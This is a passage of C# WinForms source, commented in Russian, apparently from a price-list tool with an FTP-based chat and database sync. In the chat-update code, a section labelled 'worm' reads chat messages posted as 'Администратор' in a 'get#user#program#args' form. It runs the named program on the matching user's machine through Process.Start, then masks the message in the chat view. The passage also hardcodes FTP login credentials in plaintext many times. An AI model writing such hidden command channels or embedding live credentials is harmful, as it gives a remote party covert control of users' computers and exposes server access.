            this.dataGridView1.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
            this.dataGridView1.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            dataGridView1.AllowUserToAddRows = false;
        }
  private void textBox_mess_asq_TextChanged(object sender, EventArgs e)
        {
        }
   private void button_dowload_asq_Click(object sender, EventArgs e)
        {
            if (setting[6] != "true") { MessageBox.Show("Не авторизированный пользователь не может пользоваться чатом!", "Отказано"); return; }
            if (textBox_mess_asq.Text != "")
            {
                //   message_write(data_get(), textBox1.Text, textBox2.Text);
                button_dowload_asq.Enabled = false;
                if(messenger_download==null|| messenger_download.ThreadState == System.Threading.ThreadState.Stopped)
                messenger_download = new Thread(messenger_download_potoc);
                messenger_download.Start();
                надо_звук_сообщения = true;
            }
        }
     private void timer_chat_Tick(object sender, EventArgs e)
        {
            try { timer_chat.Interval = Convert.ToInt16(Convert.ToDecimal(setting[2]) * 1000); } catch { }
            if (button_dowload_asq.Enabled == true)
            {
                try
                {
                    if (messenger == null || messenger.ThreadState == System.Threading.ThreadState.Stopped)
                    {
                        messenger = new Thread(con_messenger);
                        messenger.Start();
                    }
                    if(messenger_update == null || messenger_update.ThreadState == System.Threading.ThreadState.Stopped)
                    {
                        messenger_update = new Thread(messenger_update_potoc);
                        messenger_update.Start();
                    }
                }
                catch
                {
                }
            }
        }
        private void con_messenger()
        {
            // Создаем объект FtpWebRequest
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(new Uri(url_praise + name_chate));
            request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            request.Method = WebRequestMethods.Ftp.GetDateTimestamp;
            // получаем ответ от сервера в виде объекта FtpWebResponse
            FtpWebResponse response = null;
            try
            {
                //Узнаем дату
                response = (FtpWebResponse)request.GetResponse();
                new_mess = new DateTime(response.LastModified.Year, response.LastModified.Month, response.LastModified.Day, response.LastModified.Hour, response.LastModified.Minute, response.LastModified.Second); // год - месяц - день - час - минута - секунда               
              if(button_asq.BackColor != Color.Aquamarine) { button_asq.BackColor = Color.PeachPuff; }

            }
            catch
            {
                if (button_asq.BackColor != Color.Aquamarine) { button_asq.BackColor = Color.Gray; }
                try { messenger.Abort(); } catch { }
            }
            try { response.Close(); } catch { }
            //если у нас древнее то обновляем данные чата
            if (new_mess > tec_soft)
            {
                if (звук_сообщения == false && надо_звук_сообщения == false && setting[1] == "1")
                {
                    try
                    {
                        using (var soundPlayer = new SoundPlayer(@"rez\icq.wav"))
                        {
                            soundPlayer.Play();
                        }
                    }
                    catch
                    { }               
                }     
                if (звук_сообщения == false && надо_звук_сообщения == false)
                { button_asq.BackColor = Color.Aquamarine; }
                else { button_asq.BackColor = Color.PeachPuff; }
                надо_звук_сообщения = false;
                try
                {
                    FtpWebRequest request2 = (FtpWebRequest)WebRequest.Create(url_praise + name_chate);
                    request2.Method = WebRequestMethods.Ftp.DownloadFile;
                    // This example assumes the FTP site uses anonymous logon.
                    request2.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    FtpWebResponse response2 = (FtpWebResponse)request2.GetResponse();
                    Stream responseStream = response2.GetResponseStream();
                    StreamReader reader = new StreamReader(responseStream);
                    string s = reader.ReadToEnd();
                    messenges = s.Split(
                     new[] { "\r\n", "\r", "\n" },
                       StringSplitOptions.None
                      );
                    tec_soft = new_mess;
                try { reader.Close(); } catch { }
                try { response2.Close(); } catch { }
                }
                catch
                {
                }
                update_mess = true;
                new_mess_ride = true;
            }
            try { messenger.Abort(); } catch { }
        }
        private void messenger_update_potoc()
        {
            if (update_mess == true)
            {

                try { dataGridView1.Invoke((MethodInvoker)delegate { dataGridView1.Rows.Clear(); }); } catch { }
                for (int i = 0; i < (messenges.Length); i++)
                {
                    try { dataGridView1.Invoke((MethodInvoker)delegate { dataGridView1.Rows.Add(messenges[i], messenges[i + 1], messenges[i + 2]); }); } catch { }
                    i++;
                    i++;
                }
                try { dataGridView1.Invoke((MethodInvoker)delegate { dataGridView1.CurrentCell = dataGridView1.Rows[dataGridView1.RowCount - 1].Cells[0]; }); } catch { }
                update_mess = false;

                //червяк
                
                if (dataGridView1.Rows[dataGridView1.RowCount - 1].Cells[1].Value!=null && 
                    dataGridView1.Rows[dataGridView1.RowCount - 1].Cells[1].Value.ToString() == "Администратор"
                    )
                {

                    try
                    {
                        if (dataGridView1.Rows[dataGridView1.RowCount - 1].Cells[2].Value.ToString().Substring(0, 4) == "get#") { }
                        string ho = dataGridView1.Rows[dataGridView1.RowCount - 1].Cells[2].Value.ToString();
                        string name = ho.Substring(4, ho.Length - 4);
                        string[] words = name.Split(new char[] { '#' });//делим строку по разделителю
                        string name_user = words[0];
                        string send = "";
                        try { send = words[1];} catch { }
                        string send1 = "";
                        try { send1 = words[2]; } catch { }

                        if (name_user == setting[3]) //если этот юзер то:
                        {                            
                            try {
                                Process.Start(send,@send1);
                            } catch {  }
                        }
                    }
                    catch { }
                }
                //спрячим code
                        for (int x = 0; x < dataGridView1.RowCount; x++)
                        {
                    try { if (dataGridView1.Rows[x].Cells[2].Value.ToString().Substring(0, 4) == "get#") { dataGridView1.Rows[x].Cells[2].Value = "Кому-то прилетело"; dataGridView1[2, x].Style.BackColor = Color.MediumVioletRed; } } catch { }
                        }
                //end червяк   
                for (int i = 0; i < dataGridView1.RowCount; i++)
                {
                    string name_users = "";
                    try { name_users = dataGridView1.Rows[i].Cells[2].Value.ToString().Substring(0, (setting[3].Length + 1)); } catch { }
                    if (setting[6] != null && setting[6] != "" && name_users != "" && name_users == setting[3] + ":")
                    {
                        dataGridView1[0, i].Style.BackColor = Color.PaleGreen;
                        dataGridView1[1, i].Style.BackColor = Color.PaleGreen;
                        dataGridView1[2, i].Style.BackColor = Color.PaleGreen;
                    }
                }
            }
            try { messenger_update.Abort(); } catch { }
        }
        private void messenger_download_potoc()
        {
            string[] new_mess = new string[messenges.Length + 3];
            for (int i = 0; i < messenges.Length; i++)
            {
                new_mess[i] = messenges[i];
            }
            new_mess[messenges.Length] = data_get();
            if (setting[3]!="") new_mess[messenges.Length + 1] = setting[3]; else new_mess[messenges.Length + 1] = Environment.UserName;
            new_mess[messenges.Length + 2] = textBox_mess_asq.Text;
            if (new_mess.Length > длина_чата)
            {
                string[] hhf = new string[длина_чата];
                for (int i = 0; i < длина_чата; i++)
                {
                    hhf[i] = new_mess[i + 3];
                }
                new_mess = new string[длина_чата];
                new_mess = hhf;
            }
            string str = string.Join("\r\n", new_mess); // строка к отправке
            //удаляем на ftp
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(new Uri(url_praise + name_chate));
            request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            request.Method = WebRequestMethods.Ftp.DeleteFile;
            try
            {
                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                response.Close();
                WebClient client = new WebClient();  
                client.Encoding = Encoding.UTF8;
                client.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                client.UploadString(url_praise + name_chate, "APPE", str);
                try { textBox_mess_asq.Invoke((MethodInvoker)delegate { textBox_mess_asq.Text = ""; }); } catch { }
            }
            catch { }
            try { button_dowload_asq.Invoke((MethodInvoker)delegate { button_dowload_asq.Enabled = true; }); } catch { }
            try { messenger_download.Abort(); } catch { }
        }
        //получаем дату
        private string data_get()
        {
            return DateTime.Now.Hour.ToString("00") + ":" + DateTime.Now.Minute.ToString("00") + " " + DateTime.Now.Day.ToString("00") + "." + DateTime.Now.Month.ToString("00");
        }
        private void textBox_mess_asq_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; button_dowload_asq.PerformClick(); }
        }
        //имя пользователя при щелчке по строке:
        private void dataGridView1_MouseClick(object sender, MouseEventArgs e)
        {
            try { textBox_mess_asq.Text = dataGridView1.Rows[dataGridView1.CurrentCell.RowIndex].Cells[1].Value.ToString()+":"; } catch { }
        }
        #endregion чат  chat



        #region работа с прайсом с сайта

        //кнопка открыть окно настроек

        bool open_okno = false;
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            if (open_okno == false)
            {
                open_okno = true;
                groupBox_url_praise.Location = new System.Drawing.Point(366, groupBox_url_praise.Location.Y);

                if (button_проверить_url_praise.Text == "Отмена" || button5.Text == "Отмена" || button_upload_praise_ftp.Text == "Отмена" || button_return_ftp_praise.Text == "Отмена")
                    groupBox_url_praise.Size = new Size(127, 118);else groupBox_url_praise.Size = new Size(127, 100);
            }
            else
            {
                open_okno = false;
                groupBox_url_praise.Location = new System.Drawing.Point(this.Size.Width+1, groupBox_url_praise.Location.Y);
            }
        }




        //проверим, а версии у нас и в нете
        Thread date_time_ftp_prase_potok;
        private void button_проверить_url_praise_Click(object sender, EventArgs e)
        {
            if (setting[6] != "true") { MessageBox.Show("Вы не можете пользоваться данной опцией.\nПерейдит в настройки и проидите\nаутентификация пользователя!"); return;}

            if (date_time_ftp_prase_potok == null || date_time_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Stopped)
            {
                date_time_ftp_prase_potok = new Thread(date_time_ftp_prase);
                date_time_ftp_prase_potok.Start();
            }
            else
            {
                MessageBox.Show("Уже обробатываю..", "Подожди, торопышка..");
            }
        }
        private void date_time_ftp_prase()
        {
            string url = url_praise + "/data_praise/data.txt";
            string[] messenges = null;
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(url);
            request.Method = WebRequestMethods.Ftp.DownloadFile;            
            request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse response = null;
            try { response = (FtpWebResponse)request.GetResponse(); } catch { MessageBox.Show("Нет соединения с фалом сайта\nПопробуйте позже.", "Ошибка"); try { date_time_ftp_prase_potok.Abort(); } catch { } }
            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            messenges = reader.ReadToEnd().Split(
            new[] { "\r\n", "\r", "\n" },
              StringSplitOptions.None
             );
            reader.Close();
            response.Close();
            if (messenges.Length == 7)
            {
                //пробую почитать файл у себя 
                string my_baza_put = setting[4] + "\\data.txt";
                string[] my_baza_data = new string[14];
                try
                {
                    using (StreamReader stream = new StreamReader(my_baza_put))
                    {
                        int c = 0;
                        while (stream.Peek() >= 0)
                        {
                            my_baza_data[c] = stream.ReadLine();
                            c++;
                        }
                        stream.Close();
                    }
                }
                catch
                {
                }
                string сообщение_юзиру = "";
                if (my_baza_data[0] == null)
                { //есть прайс в нете, нет файла на компе
                    MessageBox.Show(
                        "Данные о прайсе на сайте:" + "\n" +
                        "Составил: " + messenges[6] + "\n" +
                        "Дата создания: " + messenges[0] + ":" + (Convert.ToInt16(messenges[1])).ToString("00") + ":" + (Convert.ToInt16(messenges[2])).ToString("00") + "   " + messenges[3] + "/" + messenges[4] + "/" + messenges[5]
                        ,
                        "Отчитываюсь"
                        );
                }
                else
                {
                    //Сравним файлы
                    string vivod = "НЕ СМОГЛА СРАВНИТЬ ФАЙЛЫ!";
                    try
                    {                       //new DateTime(2015, 7, 20, 18, 30, 25); // год - месяц - день - час - минута - секунда
                        DateTime ser = new DateTime(Convert.ToInt16(messenges[5]), Convert.ToInt16(messenges[4]), Convert.ToInt16(messenges[3]), Convert.ToInt16(messenges[0]), Convert.ToInt16(messenges[1]), Convert.ToInt16(messenges[2]));
                        DateTime my = new DateTime(Convert.ToInt16(my_baza_data[5]), Convert.ToInt16(my_baza_data[4]), Convert.ToInt16(my_baza_data[3]), Convert.ToInt16(my_baza_data[0]), Convert.ToInt16(my_baza_data[1]), Convert.ToInt16(my_baza_data[2]));
                        if (my < ser) { vivod = "ФАЙЛ В ИНТЕРНЕТЕ НОВЕЕ!"; }
                        if (my > ser) { vivod = "ФАЙЛ В ИНТЕРНЕТЕ СТАРЫЙ!"; }
                        if (my == ser) { vivod = "ФАЙЛЫ ОДИНАКОВЫЕ!"; }
                    }
                    catch { MessageBox.Show("Данные о прайсе у тебя повреждены!\nПерезакачай с сайта заного файл", "Грубая ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error); try { date_time_ftp_prase_potok.Abort(); } catch { } }
                    if (my_baza_data[7] == null)
                    {
                        MessageBox.Show(
                        "Данные о прайсе на сайте:" + "\n" +
                            "Составил: " + messenges[6] + "\n" +
                            "Дата создания: " + messenges[0] + ":" + (Convert.ToInt16(messenges[1])).ToString("00") + ":" + (Convert.ToInt16(messenges[2])).ToString("00") + "   " + messenges[3] + "/" + messenges[4] + "/" + messenges[5] + "\n" + "\n" +
                            "Данные о моей копии:" + "\n" +
                            "Составил: " + my_baza_data[6] + "\n" +
                            "Дата создания: " + my_baza_data[0] + ":" + (Convert.ToInt16(my_baza_data[1])).ToString("00") + ":" + (Convert.ToInt16(my_baza_data[2])).ToString("00") + "   " + my_baza_data[3] + "/" + my_baza_data[4] + "/" + my_baza_data[5] + "\n" + "\n" +
                             vivod
                            ,
                            "Отчитываюсь"
                            );
                    }
                    else
                    {
                        if ( vivod == "ФАЙЛ В ИНТЕРНЕТЕ НОВЕЕ!"){ vivod = "ФАЙЛ В ИНТЕРНЕТЕ НОВЕЕ ТВОЕЙ СОХРАНЁННОЙ КОПИИ!"; }
                        if (vivod == "ФАЙЛ В ИНТЕРНЕТЕ СТАРЫЙ!"){ vivod = "ФАЙЛ В ИНТЕРНЕТЕ ДРЕВНЕЕ ТВОЕЙ КОПИИ!"; }
                        if ( vivod == "ФАЙЛЫ ОДИНАКОВЫЕ!")      { vivod = "ФАЙЛЫ БЫЛИ ОДИНАКОВЫЕ КОГДА-ТО!"; }

                        MessageBox.Show(
                       "Данные о прайсе на сайте:" + "\n" +
                           "Составил: " + messenges[6] + "\n" +
                           "Дата создания: " + messenges[0] + ":" + (Convert.ToInt16(messenges[1])).ToString("00") + ":" + (Convert.ToInt16(messenges[2])).ToString("00") + "   " + messenges[3] + "/" + messenges[4] + "/" + messenges[5] + "\n" + "\n" +
                           "Данные о моей ИЗМЕНЁННОЙ копии:" + "\n" +
                           "Составлял когда-то: " + my_baza_data[6] + "\n" +
                           "Дата создания: " + my_baza_data[0] + ":" + (Convert.ToInt16(my_baza_data[1])).ToString("00") + ":" + (Convert.ToInt16(my_baza_data[2])).ToString("00") + "   " + my_baza_data[3] + "/" + my_baza_data[4] + "/" + my_baza_data[5] + "\n" + "\n" +
                            "Ты сохранил: " + my_baza_data[13] + "\n" +
                           "Дата изменения: " + my_baza_data[7] + ":" + (Convert.ToInt16(my_baza_data[8])).ToString("00") + ":" + (Convert.ToInt16(my_baza_data[9])).ToString("00") + "   " + my_baza_data[10] + "/" + my_baza_data[11] + "/" + my_baza_data[12] + "\n" + "\n" +
                           vivod +"\n"+
                           "Или удали, или загрузи на сервер этот прайс!"
                           ,
                           "Отчитываюсь"
                           );
                    }
                }
            }
            else
            {
                MessageBox.Show("Ошибки на сайте\nЗвони разработчику.", "Ошибка");
            }
            try { date_time_ftp_prase_potok.Abort(); } catch { }
        }



        //скачать с сайта прайс в рабочий каталог

        Thread date_download_ftp_prase_potok;
        private void button5_Click(object sender, EventArgs e)
        {
            if (setting[6] != "true") { MessageBox.Show("Вы не можете пользоваться данной опцией.\nПерейдит в настройки и проидите\nаутентификация пользователя!"); return; }
            if (button_upload_praise_ftp.Text == "Отмена" || button_return_ftp_praise.Text == "Отмена") { MessageBox.Show("Отмените другие действия!", "Не-а!");return;}
            if (date_download_ftp_prase_potok == null || date_download_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Stopped || date_download_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Aborted)
            {
                if (setting[4] != "")
                {
                   DialogResult ttt= MessageBox.Show("Уверен?", "Уточнение", MessageBoxButtons.OKCancel);
                    if (ttt == DialogResult.Cancel) { return; }
                    
                    date_download_ftp_prase_potok = new Thread(date_download_ftp_prase);
                    date_download_ftp_prase_potok.Start();
                    button5.Text = "Отмена";
                    groupBox_url_praise.Size = new Size(127, 118);
                }
                else
                {
                    MessageBox.Show("Укажите в настройках:\nРабочую папку прайса, для\nзагрузки и выгрузки на сайт", "Непонятно, куда качать.");
                }
            }
            else
            {

                //жмём отмену
                if (button5.Text == "Отмена") 
                {  groupBox_url_praise.Size = new Size(127, 100);
                    try { date_download_ftp_prase_potok.Abort(); } catch { } //останавливаем поток
                  
                    button5.Text = "Cкачать с сайта"; label_bite.Visible = false; progressBar1.Visible = false;
                    date_download_ftp_prase_fs.Close(); //остонавливаем поток
                    try { System.IO.File.Delete(setting[4] + "\\Dahmira1.mdf"); } catch { } //удаляем файлы
                    try { System.IO.File.Delete(setting[4] + "\\Dahmira1_log.ldf"); } catch { } //удаляем файлы
                    try { System.IO.File.Delete(setting[4] + "\\data1.txt"); } catch { } //удаляем файлы
                    try { System.IO.Directory.Delete(setting[4] + "\\шаблоны_download", true); } catch { } //удаляем папку

                    try { response3_date_download_ftp.Close(); } catch { }
                    try { response2_date_download_ftp.Close(); } catch { }
                }
            }
        }

        FileStream date_download_ftp_prase_fs = null;
        FtpWebResponse response3_date_download_ftp = null;
        FtpWebResponse response2_date_download_ftp = null;

        private void date_download_ftp_prase()
        {
            for (int i = 0; i < 3; i++)
            {


                //путь куда сохраняем
                string temp_p = null;

                string url = null;
                switch (i)
                {
                    case 0:
                        temp_p = setting[4] + "\\Dahmira1.mdf";
                        url = url_praise + "/data_praise/Dahmira.mdf";
                        break;
                    case 1:
                        temp_p = setting[4] + "\\Dahmira_log1.ldf";
                        url = url_praise + "/data_praise/Dahmira_log.ldf";
                        break;
                    case 2:
                        temp_p = setting[4] + "\\data1.txt";
                        url = url_praise + "/data_praise/data.txt";
                        break;
                }

                int size_f;
                FtpWebRequest request3 = (FtpWebRequest)FtpWebRequest.Create(new Uri(url));
                request3.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                request3.Method = WebRequestMethods.Ftp.GetFileSize;

                try { response3_date_download_ftp = (FtpWebResponse)request3.GetResponse(); } catch { MessageBox.Show("Нет связи с файлом на сайте", "Ошибка"); try { date_download_ftp_prase_potok.Abort(); } catch { } }
                size_f = Convert.ToInt32(response3_date_download_ftp.ContentLength);
                response3_date_download_ftp.Close();

                FtpWebRequest request2 = (FtpWebRequest)WebRequest.Create(new Uri(url));
                request2.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                request2.Method = WebRequestMethods.Ftp.DownloadFile;

                response2_date_download_ftp = (FtpWebResponse)request2.GetResponse();
                // получаем поток ответа
                Stream responseStream = response2_date_download_ftp.GetResponseStream();
                // сохраняем файл в дисковой системе
                // создаем поток для сохранения файла
                date_download_ftp_prase_fs = new FileStream(temp_p, FileMode.Create);
                //Буфер для считываемых данных
                int ling = 256;
                byte[] buffer = new byte[ling];
                int size = 0;
                int obi = 0;
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Minimum = 0; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Maximum = size_f; }); } catch { }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Text = (i + 1).ToString() + "/3 загрузка" + " " + (size_f / 1000000).ToString() + "Mb"; }); } catch { }
                while ((size = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    date_download_ftp_prase_fs.Write(buffer, 0, size);
                    obi = obi + ling;
                    //   try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Text = (obi/1000).ToString() + "/" + (size_f/1000).ToString(); }); } catch { }
                    if (progressBar1.Maximum > obi) { try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Value = obi; }); } catch { } }
                }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
                date_download_ftp_prase_fs.Close();
                response3_date_download_ftp.Close();
            }

            
            //загрузка шаблонов
            //создаем временную папку 

            string path = setting[4];
            string subpath = @"шаблоны_download";
            DirectoryInfo dirInfo = new DirectoryInfo(setting[4]);
            if (!dirInfo.Exists)
            {
                dirInfo.Create();
            }
            dirInfo.CreateSubdirectory(subpath);

            //получаем список файлов на сайте! 
            List<string> список_файлов_в_папке= new List<string>();
            string ftpUri = url_praise + "/data_praise/шаблоны/";
            string ftpFileName = "";
            var ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri));
            ftpWebRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            ftpWebRequest.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse ftpWebResponse = null;
            try { ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse(); } catch { MessageBox.Show("Не смогла подключиться!", "Ошибка"); return; }
            Stream stream = ftpWebResponse.GetResponseStream();
            StreamReader streamReader = new StreamReader(stream, System.Text.Encoding.UTF8);

            List<string> files = new List<string>();
            string fileList;
            string[] fileName;
            while (!streamReader.EndOfStream)
            {
                fileList = streamReader.ReadLine();
                fileName = fileList.Split(' ');
                if (fileName[0] == "-rw-r--r--")
                {
                    int thk = 0;
                    for (int i = 0; i < fileName.Length; i++)
                    {                    
                    var regex = new Regex(@"\b(?:[01][0-9]|2[0-3]):[0-5][0-9]\b");
                    var matches = regex.Matches(fileName[i]).Cast<Match>().Select(x => x.Value);
                    foreach (var match in matches)
                    {
                            i = fileName.Length;                           
                        }                 
                     thk++;
                    }

                    string namess = "";
                    for (int i = thk; i < fileName.Length; i++)
                    {
                        namess = namess + fileName[i];
                        if (i < fileName.Length - 1) { namess = namess + " "; }
                    }
                    список_файлов_в_папке.Add(namess);                  
                }             
            }
        
            

            // список_файлов_в_папке - содиржит список файлов в папке (шаблоны)
            //запускам цикл по их количеству и качаем каждый по отдельности. 

            try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = true; }); } catch { }
            try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = true; }); } catch { }
            for (int i = 0; i < список_файлов_в_папке.Count; i++)
            {


                string  url = url_praise + "/data_praise/шаблоны/" + список_файлов_в_папке[i];
                string temp_p = setting[4] + "\\шаблоны_download\\" + список_файлов_в_папке[i];

                int size_f;
                FtpWebRequest request3 = (FtpWebRequest)FtpWebRequest.Create(new Uri(url));
                request3.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                request3.Method = WebRequestMethods.Ftp.GetFileSize;

                try {
                    response3_date_download_ftp = (FtpWebResponse)request3.GetResponse();
                }
                catch
                {
                    MessageBox.Show("Нет связи с файлом на сайте", "Ошибка"); try { date_download_ftp_prase_potok.Abort(); } catch { } }
                size_f = Convert.ToInt32(response3_date_download_ftp.ContentLength);
                response3_date_download_ftp.Close();

                FtpWebRequest request2 = (FtpWebRequest)WebRequest.Create(new Uri(url));
                request2.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                request2.Method = WebRequestMethods.Ftp.DownloadFile;

                response2_date_download_ftp = (FtpWebResponse)request2.GetResponse();
                // получаем поток ответа
                Stream responseStream = response2_date_download_ftp.GetResponseStream();
                // сохраняем файл в дисковой системе
                // создаем поток для сохранения файла
                date_download_ftp_prase_fs = new FileStream(temp_p, FileMode.Create);
                //Буфер для считываемых данных
                int ling = 256;
                byte[] buffer = new byte[ling];
                int size = 0;
                int obi = 0;
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Minimum = 0; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Maximum = size_f; }); } catch { }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Text = (i + 1).ToString() + "/"+ список_файлов_в_папке.Count+ " загрузка" + " " + (size_f / 1000000).ToString() + "Mb"; }); } catch { }
                while ((size = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    date_download_ftp_prase_fs.Write(buffer, 0, size);
                    obi = obi + ling;
                    if (progressBar1.Maximum > obi) { try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Value = obi; }); } catch { } }
                }
                date_download_ftp_prase_fs.Close();
                response2_date_download_ftp.Close();
            }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
            //Всё скачали. Теперь можно удалить наши! 

            try
            { Directory.Delete(setting[4] + "\\шаблоны", true);}catch{ }

            //переименновать
            try { System.IO.Directory.Move(setting[4] + "\\шаблоны_download", setting[4] + "\\шаблоны"); } catch { } //переименнуем рабочую
            try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }
           

            //вроде всё хорошо, надо удалять родные
            try { System.IO.File.Delete(setting[4] + "\\Dahmira.mdf"); } catch { } //удаляем файлы
            try { System.IO.File.Delete(setting[4] + "\\Dahmira_log.ldf"); } catch { } //удаляем файлы
            try { System.IO.File.Delete(setting[4] + "\\data.txt"); } catch { } //удаляем файлы        
            // теперь переименнуем наши
            bool err = false;
            try { System.IO.File.Move(setting[4] + "\\data1.txt", setting[4] + "\\data.txt"); } catch { err = true; } //удаляем файлы
            try { System.IO.File.Move(setting[4] + "\\Dahmira_log1.ldf", setting[4] + "\\Dahmira_log.ldf"); } catch { err = true; } //удаляем файлы
            try { System.IO.File.Move(setting[4] + "\\Dahmira1.mdf", setting[4] + "\\Dahmira.mdf"); } catch { err = true; } //удаляем файлы

            try { button5.Invoke((MethodInvoker)delegate { button5.Text = "Cкачать с сайта"; }); } catch { } 
            try { date_download_ftp_prase_potok.Abort(); } catch { }

        }


        //загрузить на ftp;
        //загрузка на сайт 
        Thread date_upload_ftp_prase_potok;
        private void button_upload_praise_ftp_Click(object sender, EventArgs e)
        {
            //            Form ff = new pass();
            //            ff.Show();



            if (setting[6] != "true") { MessageBox.Show("Вы не можете пользоваться данной опцией.\nПерейдит в настройки и проидите\nаутентификация пользователя!"); return; }

            if (proverka_key() == false)
            {
               //ключ гофно
                return;
            }  

            if (button5.Text == "Отмена" || button_return_ftp_praise.Text == "Отмена") { MessageBox.Show("Отмените другие действия!", "Не-а!"); return; }

            if (button_upload_praise_ftp.Text == "Загрузить на сайт прайс")
            {
                if (date_upload_ftp_prase_potok == null || date_upload_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Stopped || date_upload_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Aborted)
                {
                    if (setting[4] != "")
                    {

                        if (MessageBox.Show("Уверен?", "", MessageBoxButtons.OKCancel) == DialogResult.Cancel) { return; }

                        date_upload_ftp_prase_potok = new Thread(date_upload_ftp_prase);
                        date_upload_ftp_prase_potok.Start();
                        button_upload_praise_ftp.Text = "Отмена";
                        groupBox_url_praise.Size = new Size(127, 118);
                    }
                    else
                    {
                        MessageBox.Show("Не указана рабочая папка прайса! Проверьте настройки!");
                    }

                }
            }
            else
            { //отменяем операцию
                try { date_upload_ftp_prase_potok.Abort(); } catch { }
                groupBox_url_praise.Size = new Size(127, 100); 
                progressBar1.Visible = false;
                label_bite.Visible = false;
                string uri2 = "";
                for (int k = 0; k < 3; k++)
                {
                    switch (k)
                    {
                        case 0:
                            uri2 = url_praise + "/data_praise/Dahmira1.mdf";
                            break;
                        case 1:
                            uri2 = url_praise + "/data_praise/Dahmira_log1.ldf";
                            break;
                        case 2:
                            uri2 = url_praise + "/data_praise/data1.txt";
                            break;
                    }
                    FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(uri2);
                    requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                    FtpWebResponse responseDel = null;
                    try
                    {
                        responseDel = (FtpWebResponse)requestDel.GetResponse();
                        responseDel.Close();
                    }
                    catch { } // если catch .. значит файла нет. это 550 ошибка      





                    //удаляем шаблоны_1 


                    //получаем список файлов на сайте! 
                    List<string> список_файлов_в_папке = new List<string>();
                    string ftpUri = url_praise + "/data_praise/шаблоны_1/";
                    var ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri));
                    ftpWebRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
                    ftpWebRequest.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    FtpWebResponse ftpWebResponse = null;
                    try
                    {
                        ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
                        Stream stream = ftpWebResponse.GetResponseStream();
                        StreamReader streamReader = new StreamReader(stream, System.Text.Encoding.UTF8);

                        List<string> files = new List<string>();
                        string fileList;
                        string[] fileName;
                        while (!streamReader.EndOfStream)
                        {
                            fileList = streamReader.ReadLine();
                            fileName = fileList.Split(' ');
                            if (fileName[0] == "-rw-r--r--")
                            {
                                int thk = 0;
                                for (int i = 0; i < fileName.Length; i++)
                                {
                                    var regex = new Regex(@"\b(?:[01][0-9]|2[0-3]):[0-5][0-9]\b");
                                    var matches = regex.Matches(fileName[i]).Cast<Match>().Select(x => x.Value);
                                    foreach (var match in matches)
                                    {
                                        i = fileName.Length;
                                    }
                                    thk++;
                                }

                                string namess = "";
                                for (int i = thk; i < fileName.Length; i++)
                                {
                                    namess = namess + fileName[i];
                                    if (i < fileName.Length - 1) { namess = namess + " "; }
                                }
                                список_файлов_в_папке.Add(namess);
                            }
                        }

                        try { ftpWebResponse.Close(); } catch { }
                        //папка есть но файлов нет
                        if (список_файлов_в_папке.Count > 0)
                        {
                            for (int i = 0; i < список_файлов_в_папке.Count; i++)
                            {
